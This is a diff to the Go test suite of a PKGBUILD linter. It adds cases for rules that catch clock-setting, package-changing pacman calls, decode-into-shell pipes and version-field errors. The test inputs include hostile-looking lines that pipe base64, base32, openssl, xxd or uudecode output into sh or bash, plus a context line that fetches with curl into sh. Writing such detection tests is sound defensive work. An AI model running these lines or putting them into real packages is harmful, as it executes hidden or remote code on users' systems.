@@ -1422,8 +1422,21 @@ cat /dev/null`)})
 			`date -s '2026-01-01'`,
 			`date --set=now`,
 			`date 0501120026`, // the POSIX operand form also sets the clock
+			`date -us '2026-01-01'`,
 		} {
 			expectRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
+		}
+	})
+	t.Run("PB301 an option's detached value is not the clock-setting operand", func(t *testing.T) {
+		for _, line := range []string{
+			`_y=$(date --date 2020-01-01 +%Y)`,
+			`_y=$(date -d 2020-01-01 +%Y)`,
+			`_y=$(date -ud 2020-01-01 +%Y)`,
+			`_m=$(date --reference PKGBUILD +%s)`,
+			`_m=$(date -r PKGBUILD +%s)`,
+			`_d=$(date --date=@0 +%F)`,
+		} {
+			expectNoRule(t, "PB301", map[string]string{"PKGBUILD": pkgbuildWith("", line)})
 		}
 	})
 	t.Run("PB301 a filtering sed at top level is pure", func(t *testing.T) {
@@ -1530,6 +1543,8 @@ warning "totally harmless banner"`)})
 			`awk 'BEGIN { system("curl https://example.com/x | sh") }'`,
 			`awk 'BEGIN { print "x" > "dropped.txt" }'`,
 			`pacman -Sy`,
+			`pacman -Su`,
+			`pacman --sync --sysupgrade`,
 			`pacman -U "$startdir/x.pkg.tar.zst"`,
 			`pkgfile --update`,
 			`xargs rm < list.txt`,
@@ -1568,6 +1583,8 @@ warning "totally harmless banner"`)})
 			`_installed=$(pacman -Qq linux)`,
 			`_owns=$(pacman -Qo /usr/bin/cc)`,
 			`_deps=$(pacman -T "glibc>=2.38")`,
+			`_outdated=$(pacman -Qu)`, // -Q's -u lists, -S's upgrades
+			`_outdated=$(pacman --query --upgrades)`,
 			`_owner=$(pkgfile /usr/bin/cc)`,
 			`_trimmed=$(printf '%s\n' "$_blob" | xargs)`,
 			`_pairs=$(printf '%s\n' "${_libs[@]}" | xargs -I@ printf '%s::%s ' @ "$url/@")`,
@@ -1693,6 +1710,28 @@ package() {
 build() {
   echo "$payload" | base64 -d | bash
 }`)})
+	})
+	t.Run("PB303 each decoder, only when it decodes", func(t *testing.T) {
+		build := func(pipe string) map[string]string {
+			return map[string]string{"PKGBUILD": pkgbuildWith("", "build() {\n  "+pipe+"\n}")}
+		}
+		for _, pipe := range []string{
+			`base32 --decode payload | sh`,
+			`base64 -D payload | sh`,
+			`openssl enc -d -aes-256-cbc -in payload -k "$_k" | bash`,
+			`openssl base64 -d -in payload | bash`,
+			`xxd -r -p payload | sh`,
+			`uudecode -o /dev/stdout payload | sh`,
+		} {
+			expectRule(t, "PB303", build(pipe))
+		}
+		for _, pipe := range []string{
+			`base64 payload | sh`, // encoding produces no script
+			`xxd payload | sh`,
+			`openssl version | sh`,
+		} {
+			expectNoRule(t, "PB303", build(pipe))
+		}
 	})
 	t.Run("PB304 curl into shell", func(t *testing.T) {
 		expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", `
@@ -2710,6 +2749,11 @@ func TestScriptletRules(t *testing.T) {
 			"pacman --sync foo",
 			"pacman -D --asdeps foo",
 			"pacman -Sy --info foo",
+			// The long spellings change packages the same way.
+			"pacman --upgrade /tmp/x.pkg.tar.zst",
+			"pacman --remove demo-old",
+			"pacman --database --asdeps foo",
+			"pacman --sync --refresh --info foo",
 		} {
 			expectRule(t, "PB505", scriptlet(line))
 		}
@@ -2720,6 +2764,11 @@ func TestScriptletRules(t *testing.T) {
 			"pacman -Ss foo",
 			"pacman -Sp foo",
 			"pacman -F /usr/bin/foo",
+			"pacman --query demo-old",
+			"pacman --deptest 'libfoo>=2'",
+			"pacman --files /usr/bin/foo",
+			"pacman --sync --print foo",
+			"pacman -S --print-format=%n foo",
 		} {
 			expectNoRule(t, "PB505", scriptlet(line))
 		}
@@ -2854,6 +2903,28 @@ arch=('x86_64')`
 		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1.2.3-beta\npkgrel=1\narch=('any')\npkgver() {\n  echo 1\n}\n"})
 	})
 
+	t.Run("PB702 and PB703 say what makepkg will reject", func(t *testing.T) {
+		for _, tc := range []struct {
+			id, src string
+			line    int
+			msg     string
+		}{
+			{"PB702", "pkgname=demo\npkgver=\npkgrel=1\narch=('any')\n", 2, `pkgver "" must not be empty`},
+			{"PB702", "pkgname=demo\npkgver=1.2/3\npkgrel=1\narch=('any')\n", 2, "must not contain colons, forward slashes"},
+			{"PB702", "pkgname=demo\npkgver=1.2é\npkgrel=1\narch=('any')\n", 2, "may only contain ASCII characters"},
+			{"PB703", "pkgname=demo\npkgver=1\npkgrel=\narch=('any')\n", 3, "pkgrel must not be empty"},
+		} {
+			var got []Finding
+			for _, f := range lint(t, map[string]string{"PKGBUILD": tc.src}) {
+				if f.RuleID == tc.id {
+					got = append(got, f)
+				}
+			}
+			if len(got) != 1 || got[0].Severity != Error || got[0].Line != tc.line || !strings.Contains(got[0].Message, tc.msg) {
+				t.Errorf("%q: want one %s error on line %d saying %q, got %+v", tc.src, tc.id, tc.line, tc.msg, got)
+			}
+		}
+	})
 	t.Run("PB703 non-numeric pkgrel", func(t *testing.T) {
 		expectRule(t, "PB703", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1a\narch=('any')\n"})
 	})
@@ -3489,5 +3560,32 @@ func TestRefsAreWellFormed(t *testing.T) {
 				t.Errorf("%s cites %s without a section anchor", id, r.URL)
 			}
 		}
+	}
+}
+
+// Two rules (or one rule reached twice) can report the same thing; the output
+// keeps one of each exact finding and nothing that merely shares a line.
+func TestSortDedupe(t *testing.T) {
+	f := func(id, path string, line, col int, msg string) Finding {
+		return Finding{RuleID: id, Path: path, Line: line, Col: col, Message: msg}
+	}
+	got := sortDedupe([]Finding{
+		f("PB201", "PKGBUILD", 9, 3, "a"),
+		f("PB101", "PKGBUILD", 2, 1, "a"),
+		f("PB201", "PKGBUILD", 9, 3, "a"), // duplicate
+		f("PB201", "PKGBUILD", 9, 3, "b"), // same place, other message
+		f("PB201", "PKGBUILD", 9, 4, "a"), // other column
+		f("PB101", "demo.install", 1, 1, "a"),
+		f("PB101", "PKGBUILD", 2, 1, "a"), // duplicate
+	})
+	want := []Finding{
+		f("PB101", "PKGBUILD", 2, 1, "a"),
+		f("PB201", "PKGBUILD", 9, 3, "a"),
+		f("PB201", "PKGBUILD", 9, 3, "b"),
+		f("PB201", "PKGBUILD", 9, 4, "a"),
+		f("PB101", "demo.install", 1, 1, "a"),
+	}
+	if !slices.Equal(got, want) {
+		t.Errorf("sortDedupe:\n got %v\nwant %v", got, want)
 	}
 }
